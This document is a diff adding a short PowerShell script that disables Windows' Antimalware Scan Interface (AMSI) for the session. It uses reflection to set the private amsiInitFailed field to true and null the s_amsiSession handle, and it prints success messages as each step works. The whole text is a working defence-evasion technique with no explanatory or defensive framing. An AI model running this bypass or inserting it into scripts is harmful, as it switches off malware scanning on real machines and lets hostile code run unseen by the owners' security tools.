@@ -1,0 +1,14 @@
+$amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$initFailedField = $amsiUtils.GetField('amsiInitFailed', [System.Reflection.BindingFlags]'NonPublic,Static')
+if ($initFailedField) {
+    $initFailedField.SetValue($null, $true)
+    Write-Host "[+] AMSI bypassed via amsiInitFailed" -ForegroundColor Green
+} else {
+    Write-Host "[-] amsiInitFailed field not found" -ForegroundColor Red
+}
+
+$sessField = $amsiUtils.GetField('s_amsiSession', [System.Reflection.BindingFlags]'NonPublic,Static')
+if ($sessField) {
+    $sessField.SetValue($null, [IntPtr]::Zero)
+    Write-Host "[+] s_amsiSession nulled as bonus" -ForegroundColor Green
+}
